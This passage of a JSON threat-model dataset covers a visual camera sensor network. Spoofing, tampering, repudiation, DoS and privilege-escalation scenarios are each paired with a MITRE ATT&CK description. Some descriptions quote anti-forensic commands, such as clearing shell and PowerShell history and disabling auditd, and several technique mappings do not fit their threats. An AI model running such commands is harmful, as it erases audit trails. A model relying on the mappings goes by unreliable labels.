                "id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345",
                "technique_id": "T1222.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to stored visual data through poorly secured databases.",
            "Assumptions": [
                {
                    "Assumption": "Database security configurations are weak.",
                    "Role": "Database Administrator",
                    "Condition": "Valid if default settings are used without hardening."
                },
                {
                    "Assumption": "Access controls are not stringent.",
                    "Role": "System Designer",
                    "Condition": "Valid if user roles and permissions are poorly enforced."
                },
                {
                    "Assumption": "Intrusion detection systems are not in place.",
                    "Role": "System Administrator",
                    "Condition": "Valid if unauthorized access attempts are not logged or monitored."
                }
            ],
            "Potential Impact": "Data leaks of stored visual data can lead to severe privacy and security concerns.",
            "MITRE ATT&CK Keywords": [
                "database",
                "sensitive data",
                "access control",
                "data leakage"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed denial-of-service (DDoS) attack against the centralized VSN server to disrupt data flow.",
            "Assumptions": [
                {
                    "Assumption": "The server is accessible over the internet.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if external access is necessary for operation."
                },
                {
                    "Assumption": "Server lacks sufficient DDoS protection mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Valid if anti-DDoS services are not in place."
                },
                {
                    "Assumption": "Attacker has control over a botnet to flood the server with requests.",
                    "Role": "Attacker",
                    "Condition": "Valid if a botnet can be leveraged."
                }
            ],
            "Potential Impact": "Disruption of visual data collection and processing, affecting system availability.",
            "MITRE ATT&CK Keywords": [
                "ddos",
                "availability",
                "network",
                "server"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious code execution leading to resource exhaustion in the VSN camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "Nodes can execute arbitrary code without restrictions.",
                    "Role": "System Designer",
                    "Condition": "Valid if execution policies are not enforced."
                },
                {
                    "Assumption": "There is no resource monitoring or limitation.",
                    "Role": "System Administrator",
                    "Condition": "Valid if resource usage is not tracked and controlled."
                },
                {
                    "Assumption": "Malware can propagate through the network.",
                    "Role": "Attacker",
                    "Condition": "Valid if network segmentation and malware detection are weak."
                }
            ],
            "Potential Impact": "Node unavailability affecting the overall functionality of the VSN.",
            "MITRE ATT&CK Keywords": [
                "resource exhaustion",
                "denial of service",
                "malware",
                "execution"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of vulnerabilities in camera node firmware to cause repeated reboots.",
            "Assumptions": [
                {
                    "Assumption": "Firmware vulnerabilities are present and unpatched.",
                    "Role": "System Administrator",
                    "Condition": "Valid if firmware updates are neglected."
                },
                {
                    "Assumption": "The attacker can remotely exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if remote access is possible."
                },
                {
                    "Assumption": "No protective measures are in place against firmware exploitation.",
                    "Role": "System Designer",
                    "Condition": "Valid if security hardening practices are absent."
                }
            ],
            "Potential Impact": "Camera nodes repeatedly reboot, causing service interruptions.",
            "MITRE ATT&CK Keywords": [
                "firmware",
                "vulnerabilities",
                "denial of service",
                "reboot"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of kernel vulnerabilities in the Linux-based VSN nodes to gain root access.",
            "Assumptions": [
                {
                    "Assumption": "System is running a vulnerable version of the Linux kernel.",
                    "Role": "System Administrator",
                    "Condition": "Valid if kernel updates are not applied."
                },
                {
                    "Assumption": "The attacker has local or remote access to the nodes.",
                    "Role": "Attacker",
                    "Condition": "Valid if access can be gained through other means."
                },
                {
                    "Assumption": "No kernel-level security mechanisms are in place.",
                    "Role": "System Designer",
                    "Condition": "Valid if additional security layers like SELinux are not utilized."
                }
            ],
            "Potential Impact": "Complete control over the node, allowing for extensive data manipulation and system compromise.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "kernel",
                "root access",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Leveraging the XXE vulnerability in XML parsers to perform server-side request forgery (SSRF) and access internal services.",
            "Assumptions": [
                {
                    "Assumption": "The system uses vulnerable XML parsers.",
                    "Role": "System Designer",
                    "Condition": "Valid if parsers are not secured."
                },
                {
                    "Assumption": "External entities are not disabled in the XML configuration.",
                    "Role": "System Administrator",
                    "Condition": "Valid if XML configurations are left at default settings."
                },
                {
                    "Assumption": "The attacker can send crafted XML payloads to the system.",
                    "Role": "Attacker",
                    "Condition": "Valid if input validation is weak."
                }
            ],
            "Potential Impact": "Access to internal services and potential data leakage or system manipulation through SSRF.",
            "MITRE ATT&CK Keywords": [
                "xxe",
                "server-side request forgery",
                "vulnerability",
                "xml"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of deserialization vulnerability to execute arbitrary code in the VSN backend.",
            "Assumptions": [
                {
                    "Assumption": "Deserialization of untrusted data is allowed.",
                    "Role": "System Designer",
                    "Condition": "Valid if input validation is absent."
                },
                {
                    "Assumption": "The attacker can craft malicious payloads.",
                    "Role": "Attacker",
                    "Condition": "Valid if payload generation tools are accessible."
                },
                {
                    "Assumption": "There are no runtime protections against code injection.",
                    "Role": "System Administrator",
                    "Condition": "Valid if code execution controls are not enforced."
                }
            ],
            "Potential Impact": "Execution of arbitrary code leading to full system compromise and data breach.",
            "MITRE ATT&CK Keywords": [
                "deserialization",
                "code execution",
                "vulnerability",
                "arbitrary code"
            ],
            "mitre_technique": {
                "name": "Vulnerabilities",
                "description": "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).",
                "id": "attack-pattern--2b5aa86b-a0df-4382-848d-30abea443327",
                "technique_id": "T1588.006"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "12",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate camera node to gain access to the Visual Sensor Network.",
            "Assumptions": [
                {
                    "Assumption": "The attacker is able to physically access or wirelessly intercept communication with the network.",
                    "Role": "Attacker",
                    "Condition": "Valid if physical or wireless access is not sufficiently restricted."
                },
                {
                    "Assumption": "The network does not have robust authentication mechanisms in place.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if authentication is not enforced."
                },
                {
                    "Assumption": "The attacker can obtain or generate network credentials.",
                    "Role": "Attacker",
                    "Condition": "Valid if credentials can be easily guessed or intercepted."
                }
            ],
            "Potential Impact": "Unauthorized visual data access compromising confidentiality.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "credential access"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a compromised node to spread malware and further infiltrate the network.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has compromised a node within the network.",
                    "Role": "Attacker",
                    "Condition": "Valid if a node is already compromised."
                },
                {
                    "Assumption": "Network traffic monitoring is insufficient to detect anomalous behavior.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if network monitoring is weak or absent."
                },
                {
                    "Assumption": "Malware signature is not detected by the existing security mechanisms.",
                    "Role": "Security Systems",
                    "Condition": "Valid if malware signatures are not updated or sophisticated."
                }
            ],
            "Potential Impact": "Further spread of malware leading to information disclosure and integrity issues.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "malware",
                "network infiltration",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A man-in-the-middle attack manipulates ongoing visual data transmission.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept communication between nodes and the network.",
                    "Role": "Attacker",
                    "Condition": "Valid if communication channels are not encrypted or secured."
                },
                {
                    "Assumption": "The attacker can decode and re-encode the visual data without detection.",
                    "Role": "Attacker",
                    "Condition": "Valid if data integrity checks are weak or non-existent."
                },
                {
                    "Assumption": "The network nodes do not verify the authenticity of the data source.",
                    "Role": "Network Devices",
                    "Condition": "Valid if source verification is not implemented."
                }
            ],
            "Potential Impact": "Tampering with visual data leading to integrity and reliability issues.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "man-in-the-middle",
                "data manipulation",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the firmware of the camera nodes to alter the captured visual data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to the camera nodes.",
                    "Role": "Attacker",
                    "Condition": "Valid if access controls are weak or physical security is compromised."
                },
                {
                    "Assumption": "Firmware is not checked or verified for integrity upon boot.",
                    "Role": "Device Security Systems",
                    "Condition": "Valid if firmware integrity checks are missing."
                },
                {
                    "Assumption": "Firmware updates can be applied without proper authorization.",
                    "Role": "System Administrator",
                    "Condition": "Valid if update processes lack robust authentication."
                }
            ],
            "Potential Impact": "Compromised data integrity and potential data loss.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "device",
                "manipulation"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious code into the data transmission channel.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access the data transmission channel.",
                    "Role": "Attacker",
                    "Condition": "Valid if data channels are not secured."
                },
                {
                    "Assumption": "The data transmission lacks encryption or uses weak encryption methods.",
                    "Role": "Network Security Solutions",
                    "Condition": "Valid if encryption strategies are weak or non-existent."
                },
                {
                    "Assumption": "There is no verification mechanism for the integrity of transmitted data.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if data integrity checks are not implemented."
                }
            ],
            "Potential Impact": "Compromise of data integrity and potential system disruption.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "code injection",
                "data transmission",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies stored visual data to remove or alter evidence.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to storage systems.",
                    "Role": "Attacker",
                    "Condition": "Valid if storage security is weak or compromised."
                },
                {
                    "Assumption": "Stored data lacks sufficient authentication and encryption.",
                    "Role": "Data Custodian",
                    "Condition": "Valid if data is stored without encryption or integrity checks."
                },
                {
                    "Assumption": "Data modification actions are not logged or monitored.",
                    "Role": "System Administrator",
                    "Condition": "Valid if logging and monitoring are absent or insufficient."
                }
            ],
            "Potential Impact": "Loss of data integrity and reliability in the stored visual records.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data modification",
                "storage",
                "evidence manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--70dbd200-3daa-4b8a-b544-6d81a8d2cf04",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies responsibility for actions taken within the VSN by tampering with log records.",
            "Assumptions": [
                {
                    "Assumption": "Security logs are accessible and can be modified.",
                    "Role": "Attacker",
                    "Condition": "Valid if logging systems are not secured."
                },
                {
                    "Assumption": "Logs are not backed up in a tamper-proof environment.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if log backups are insufficient or non-existent."
                },
                {
                    "Assumption": "There is no verification or integrity check for log records.",
                    "Role": "Security Systems",
                    "Condition": "Valid if log integrity is not enforced."
                }
            ],
            "Potential Impact": "Disruption of audits and forensic investigations due to compromised logs.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log tampering",
                "audit evasion",
                "forensics"
            ],
            "mitre_technique": {
                "name": "Clear Command History",
                "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
                "id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
                "technique_id": "T1070.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Authorized users deny their actions taken on the network due to lack of non-repudiation controls.",
            "Assumptions": [
                {
                    "Assumption": "Non-repudiation mechanisms like digital signatures or strong authentication are not in place.",
                    "Role": "System Administrator",
                    "Condition": "Valid if non-repudiation is weak or absent."
                },
                {
                    "Assumption": "There is no enforced accountability or audit trail for user actions.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if user actions are not logged or monitored properly."
                }
            ],
            "Potential Impact": "Difficulty in attributing actions to users, leading to potential security policy breaches.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "user actions",
                "audit",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Linux Audit System",
                "description": "Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.\n\nOften referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`,  containing a sequence of `auditctl` commands loaded at boot time.(Citation: Red Hat System Auditing)(Citation: IzyKnows auditd threat detection 2022)\n\nWith root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious activity.(Citation: Trustwave Honeypot SkidMap 2023)(Citation: ESET Ebury Feb 2014)",
